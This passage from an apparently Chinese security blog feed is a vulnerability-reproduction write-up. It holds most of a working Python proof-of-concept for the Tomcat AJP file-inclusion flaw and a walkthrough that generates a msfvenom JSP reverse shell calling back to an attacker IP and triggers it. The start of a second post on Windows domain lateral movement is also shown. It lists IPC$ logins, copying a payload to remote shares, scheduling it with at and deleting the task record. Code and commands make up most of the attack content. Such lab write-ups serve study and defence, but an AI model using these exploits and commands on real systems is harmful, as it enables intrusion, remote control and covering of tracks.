punctuation">(</span>stream<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>server_name <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>server_port <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">">h"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>is_ssl <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"?"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>num_headers<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">">H"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request_headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>self<span class="token punctuation">.</span>num_headers<span class="token punctuation">)</span><span class="token punctuation">:</span>            code<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">">H"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> code <span class="token operator">></span> <span class="token number">0xA000</span><span class="token punctuation">:</span>                h_name <span class="token operator">=</span> AjpForwardRequest<span class="token punctuation">.</span>COMMON_HEADERS<span class="token punctuation">[</span>code <span class="token operator">-</span> <span class="token number">0xA001</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                h_name <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"%ds"</span> <span class="token operator">%</span> code<span class="token punctuation">)</span>                stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># \0</span>            h_value <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request_headers<span class="token punctuation">[</span>h_name<span class="token punctuation">]</span> <span class="token operator">=</span> h_value    <span class="token keyword">def</span> <span class="token function">send_and_receive</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> socket<span class="token punctuation">,</span> stream<span class="token punctuation">,</span> save_cookies<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        i <span class="token operator">=</span> socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>self<span class="token punctuation">.</span>serialize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>method <span class="token operator">==</span> AjpForwardRequest<span class="token punctuation">.</span>POST<span class="token punctuation">:</span>            <span class="token keyword">return</span> res        r <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>        <span class="token keyword">assert</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_HEADERS        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r<span class="token punctuation">)</span>        <span class="token keyword">if</span> save_cookies <span class="token operator">and</span> <span class="token string">'Set-Cookie'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>response_headers<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'SC_REQ_COOKIE'</span><span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">.</span>response_headers<span class="token punctuation">[</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># read body chunks and end response packets</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>            res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r<span class="token punctuation">)</span>            <span class="token keyword">if</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>END_RESPONSE<span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">elif</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_BODY_CHUNK<span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">raise</span> NotImplementedError                <span class="token keyword">break</span>        <span class="token keyword">return</span> res<span class="token keyword">class</span> <span class="token class-name">AjpResponse</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    _<span class="token punctuation">,</span>_<span class="token punctuation">,</span>_<span class="token punctuation">,</span>SEND_BODY_CHUNK<span class="token punctuation">,</span> SEND_HEADERS<span class="token punctuation">,</span> END_RESPONSE<span class="token punctuation">,</span> GET_BODY_CHUNK <span class="token operator">=</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>    COMMON_SEND_HEADERS <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"Content-Language"</span><span class="token punctuation">,</span> <span class="token string">"Content-Length"</span><span class="token punctuation">,</span> <span class="token string">"Date"</span><span class="token punctuation">,</span> <span class="token string">"Last-Modified"</span><span class="token punctuation">,</span>            <span class="token string">"Location"</span><span class="token punctuation">,</span> <span class="token string">"Set-Cookie"</span><span class="token punctuation">,</span> <span class="token string">"Set-Cookie2"</span><span class="token punctuation">,</span> <span class="token string">"Servlet-Engine"</span><span class="token punctuation">,</span> <span class="token string">"Status"</span><span class="token punctuation">,</span> <span class="token string">"WWW-Authenticate"</span>            <span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># read headers</span>        self<span class="token punctuation">.</span>magic<span class="token punctuation">,</span> self<span class="token punctuation">.</span>data_length<span class="token punctuation">,</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">">HHb"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_HEADERS<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>parse_send_headers<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>        <span class="token keyword">elif</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_BODY_CHUNK<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>parse_send_body_chunk<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>        <span class="token keyword">elif</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>END_RESPONSE<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>parse_end_response<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>        <span class="token keyword">elif</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>GET_BODY_CHUNK<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>parse_get_body_chunk<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> NotImplementedError    <span class="token keyword">def</span> <span class="token function">parse_send_headers</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>http_status_code<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">">H"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>http_status_msg <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>num_headers<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">">H"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>response_headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>self<span class="token punctuation">.</span>num_headers<span class="token punctuation">)</span><span class="token punctuation">:</span>            code<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">">H"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> code <span class="token operator">&lt;=</span> <span class="token number">0xA000</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># custom header</span>                h_name<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"%ds"</span> <span class="token operator">%</span> code<span class="token punctuation">)</span>                stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># \0</span>                h_value <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                h_name <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>COMMON_SEND_HEADERS<span class="token punctuation">[</span>code<span class="token number">-0xA001</span><span class="token punctuation">]</span>                h_value <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>response_headers<span class="token punctuation">[</span>h_name<span class="token punctuation">]</span> <span class="token operator">=</span> h_value    <span class="token keyword">def</span> <span class="token function">parse_send_body_chunk</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>data_length<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">">H"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span>self<span class="token punctuation">.</span>data_length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">parse_end_response</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>reuse<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">parse_get_body_chunk</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>        rlen<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">">H"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> rlen    @staticmethod    <span class="token keyword">def</span> <span class="token function">receive</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> AjpResponse<span class="token punctuation">(</span><span class="token punctuation">)</span>        r<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>        <span class="token keyword">return</span> r<span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">prepare_ajp_forward_request</span><span class="token punctuation">(</span>target_host<span class="token punctuation">,</span> req_uri<span class="token punctuation">,</span> method<span class="token operator">=</span>AjpForwardRequest<span class="token punctuation">.</span>GET<span class="token punctuation">)</span><span class="token punctuation">:</span>    fr <span class="token operator">=</span> AjpForwardRequest<span class="token punctuation">(</span>AjpForwardRequest<span class="token punctuation">.</span>SERVER_TO_CONTAINER<span class="token punctuation">)</span>    fr<span class="token punctuation">.</span>method <span class="token operator">=</span> method    fr<span class="token punctuation">.</span>protocol <span class="token operator">=</span> <span class="token string">"HTTP/1.1"</span>    fr<span class="token punctuation">.</span>req_uri <span class="token operator">=</span> req_uri    fr<span class="token punctuation">.</span>remote_addr <span class="token operator">=</span> target_host    fr<span class="token punctuation">.</span>remote_host <span class="token operator">=</span> None    fr<span class="token punctuation">.</span>server_name <span class="token operator">=</span> target_host    fr<span class="token punctuation">.</span>server_port <span class="token operator">=</span> <span class="token number">80</span>    fr<span class="token punctuation">.</span>request_headers <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'SC_REQ_ACCEPT'</span><span class="token punctuation">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span>        <span class="token string">'SC_REQ_CONNECTION'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>        <span class="token string">'SC_REQ_CONTENT_LENGTH'</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span>        <span class="token string">'SC_REQ_HOST'</span><span class="token punctuation">:</span> target_host<span class="token punctuation">,</span>        <span class="token string">'SC_REQ_USER_AGENT'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla'</span><span class="token punctuation">,</span>        <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate, sdch'</span><span class="token punctuation">,</span>        <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.5'</span><span class="token punctuation">,</span>        <span class="token string">'Upgrade-Insecure-Requests'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span>        <span class="token string">'Cache-Control'</span><span class="token punctuation">:</span> <span class="token string">'max-age=0'</span>    <span class="token punctuation">}</span>    fr<span class="token punctuation">.</span>is_ssl <span class="token operator">=</span> <span class="token boolean">False</span>    fr<span class="token punctuation">.</span>attributes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> fr<span class="token keyword">class</span> <span class="token class-name">Tomcat</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>target_host <span class="token operator">=</span> target_host        self<span class="token punctuation">.</span>target_port <span class="token operator">=</span> target_port        self<span class="token punctuation">.</span>socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>stream <span class="token operator">=</span> self<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>makefile<span class="token punctuation">(</span><span class="token string">"rb"</span><span class="token punctuation">,</span> bufsize<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">perform_request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> req_uri<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'GET'</span><span class="token punctuation">,</span> user<span class="token operator">=</span>None<span class="token punctuation">,</span> password<span class="token operator">=</span>None<span class="token punctuation">,</span> attributes<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 文件读取</span>        <span class="token comment" spellcheck="true"># self.req_uri = req_uri </span>    <span class="token comment" spellcheck="true"># 文件包含</span>        self<span class="token punctuation">.</span>req_uri <span class="token operator">=</span> req_uri <span class="token operator">+</span> <span class="token string">".jsp"</span>        self<span class="token punctuation">.</span>forward_request <span class="token operator">=</span> prepare_ajp_forward_request<span class="token punctuation">(</span>self<span class="token punctuation">.</span>target_host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>req_uri<span class="token punctuation">,</span> method<span class="token operator">=</span>AjpForwardRequest<span class="token punctuation">.</span>REQUEST_METHODS<span class="token punctuation">.</span>get<span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Getting resource at ajp13://%s:%d%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>target_host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>target_port<span class="token punctuation">,</span> req_uri<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token operator">and</span> password <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>forward_request<span class="token punctuation">.</span>request_headers<span class="token punctuation">[</span><span class="token string">'SC_REQ_AUTHORIZATION'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Basic "</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">"%s:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>user<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> h <span class="token keyword">in</span> headers<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>forward_request<span class="token punctuation">.</span>request_headers<span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">=</span> headers<span class="token punctuation">[</span>h<span class="token punctuation">]</span>        <span class="token keyword">for</span> a <span class="token keyword">in</span> attributes<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>forward_request<span class="token punctuation">.</span>attributes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>        responses <span class="token operator">=</span> self<span class="token punctuation">.</span>forward_request<span class="token punctuation">.</span>send_and_receive<span class="token punctuation">(</span>self<span class="token punctuation">.</span>socket<span class="token punctuation">,</span> self<span class="token punctuation">.</span>stream<span class="token punctuation">)</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>responses<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> None<span class="token punctuation">,</span> None        snd_hdrs_res <span class="token operator">=</span> responses<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        data_res <span class="token operator">=</span> responses<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>data_res<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No data in response. Headers:%s\n"</span> <span class="token operator">%</span> snd_hdrs_res<span class="token punctuation">.</span>response_headers<span class="token punctuation">)</span>        <span class="token keyword">return</span> snd_hdrs_res<span class="token punctuation">,</span> data_res<span class="token triple-quoted-string string">'''javax.servlet.include.request_urijavax.servlet.include.path_infojavax.servlet.include.servlet_path'''</span><span class="token keyword">import</span> argparseparser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"target"</span><span class="token punctuation">,</span> type<span class="token operator">=</span>str<span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">"Hostname or IP to attack"</span><span class="token punctuation">)</span>parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> <span class="token string">'--port'</span><span class="token punctuation">,</span> type<span class="token operator">=</span>int<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">8009</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">"AJP port to attack (default is 8009)"</span><span class="token punctuation">)</span>parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"-f"</span><span class="token punctuation">,</span> <span class="token string">'--file'</span><span class="token punctuation">,</span> type<span class="token operator">=</span>str<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'WEB-INF/web.xml'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">"file path :(WEB-INF/web.xml)"</span><span class="token punctuation">)</span>args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>t <span class="token operator">=</span> Tomcat<span class="token punctuation">(</span>args<span class="token punctuation">.</span>target<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">)</span>_<span class="token punctuation">,</span>data <span class="token operator">=</span> t<span class="token punctuation">.</span>perform_request<span class="token punctuation">(</span><span class="token string">'/asdf'</span><span class="token punctuation">,</span>attributes<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'req_attribute'</span><span class="token punctuation">,</span><span class="token string">'value'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'javax.servlet.include.request_uri'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'req_attribute'</span><span class="token punctuation">,</span><span class="token string">'value'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'javax.servlet.include.path_info'</span><span class="token punctuation">,</span>args<span class="token punctuation">.</span>file<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'req_attribute'</span><span class="token punctuation">,</span><span class="token string">'value'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'javax.servlet.include.servlet_path'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'----------------------------'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>d<span class="token punctuation">.</span>data <span class="token keyword">for</span> d <span class="token keyword">in</span> data<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>执行 poc </p><pre class=" language-python"><code class="language-python">python2 poc<span class="token punctuation">.</span>py <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span> <span class="token operator">-</span>p <span class="token number">8009</span> <span class="token operator">-</span>f <span class="token string">"WEB-INF/web.xml"</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200221123454.png-water_print" alt=""></p><h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><h4 id="msfvenom-生成-webshell"><a href="#msfvenom-生成-webshell" class="headerlink" title="msfvenom 生成 webshell"></a>msfvenom 生成 webshell</h4><pre class=" language-bash"><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>IP LPORT<span class="token operator">=</span>4444 <span class="token operator">></span> shell.txt</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200221124816.png-water_print" alt=""></p><h4 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h4><p>由于该漏洞要配合 <code>文件上传</code> ，再进行文件包含，进而执行命令：</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 查看容器 ID</span>docker <span class="token function">ps</span> -adocker <span class="token function">cp</span> shell.txt 容器ID:/usr/local/tomcat/webapps/ROOT/shell.txt</code></pre><p>查看文件：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200221123848.png-water_print" alt=""></p><h4 id="启动-msf-监听"><a href="#启动-msf-监听" class="headerlink" title="启动 msf 监听"></a>启动 msf 监听</h4><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200221124024.png-water_print" alt=""></p><h4 id="执行修改后的-exp："><a href="#执行修改后的-exp：" class="headerlink" title="执行修改后的 exp："></a>执行<code>修改后</code>的 exp：</h4><pre class=" language-bash"><code class="language-bash">python2 poc.py 127.0.0.1 -p 8009 -f <span class="token string">"/shell.txt"</span></code></pre><p><code>注意</code>：本人在测试时，使用一般的传参数的 webshell 时无法正确解析，可以进一步修改脚本解决。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200221124418.png-water_print" alt=""></p><p>成功弹回 shell</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200221124847.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域内横向移动分析</title>
      <link href="/2020/02/17/yu-nei-heng-xiang-yi-dong-fen-xi/"/>
      <url>/2020/02/17/yu-nei-heng-xiang-yi-dong-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="域内横向移动分析"><a href="#域内横向移动分析" class="headerlink" title="域内横向移动分析"></a>域内横向移动分析</h1><h2 id="常用-Windows-远程连接和相关命令"><a href="#常用-Windows-远程连接和相关命令" class="headerlink" title="常用 Windows 远程连接和相关命令"></a>常用 Windows 远程连接和相关命令</h2><h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h3><pre class=" language-cmd"><code class="language-cmd">net use \\IP\ipc$ "password" /user:Administrator</code></pre><h4 id="IPC-的利用条件"><a href="#IPC-的利用条件" class="headerlink" title="IPC 的利用条件"></a>IPC 的利用条件</h4><ul><li>开启 139 端口</li><li>管理员开启了默认共享</li></ul><h3 id="使用-Windows-自带的工具获取远程主机信息"><a href="#使用-Windows-自带的工具获取远程主机信息" class="headerlink" title="使用 Windows 自带的工具获取远程主机信息"></a>使用 Windows 自带的工具获取远程主机信息</h3><h4 id="dir-命令"><a href="#dir-命令" class="headerlink" title="dir 命令"></a>dir 命令</h4><pre class=" language-cmd"><code class="language-cmd">dir \\IP\c$</code></pre><h4 id="tasklist-命令"><a href="#tasklist-命令" class="headerlink" title="tasklist 命令"></a>tasklist 命令</h4><pre class=" language-cmd"><code class="language-cmd">tasklist /S IP /U administrator /P password</code></pre><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><h4 id="at-命令"><a href="#at-命令" class="headerlink" title="at 命令"></a>at 命令</h4><p>主要在 Windows server 2008 之前版本</p><h5 id="查看目标系统时间"><a href="#查看目标系统时间" class="headerlink" title="查看目标系统时间"></a>查看目标系统时间</h5><pre class=" language-cmd"><code class="language-cmd">net time \\IP</code></pre><h5 id="将-payload-复制到目标系统中"><a href="#将-payload-复制到目标系统中" class="headerlink" title="将 payload 复制到目标系统中"></a>将 payload 复制到目标系统中</h5><pre class=" language-cmd"><code class="language-cmd">copy payload.bat \\IP\C$</code></pre><h5 id="使用-at-命令创建计划任务"><a href="#使用-at-命令创建计划任务" class="headerlink" title="使用 at 命令创建计划任务"></a>使用 at 命令创建计划任务</h5><pre class=" language-cmd"><code class="language-cmd">at \\IP 8:00AM C:\payload.bat</code></pre><p>返回一个计划任务 ID</p><h5 id="清除-at-记录"><a href="#清除-at-记录" class="headerlink" title="清除 at 记录"></a>清除 at 记录</h5><pre class=" language-cmd"><code class="language-cmd">at \\IP taskID /delete</code></pre><p>使用 at 将执行结果保存到远程，再读取结果：</p><pre class=" language-cmd"><code class="language-cmd">at \\IP 8:00AM cmd.exe /c "ipconfig > C:/1.txt"</code></pre><pre class=" language-cmd"><code class="language-cmd">type \\IP\C$\1.txt</code></pre><h4 id="schtask-命令"><a href="#schtask-命令" class="headerlink" title="schtask 命令"></a>schtask 命令</h4><h5 id="建立-IPC-连接"><a 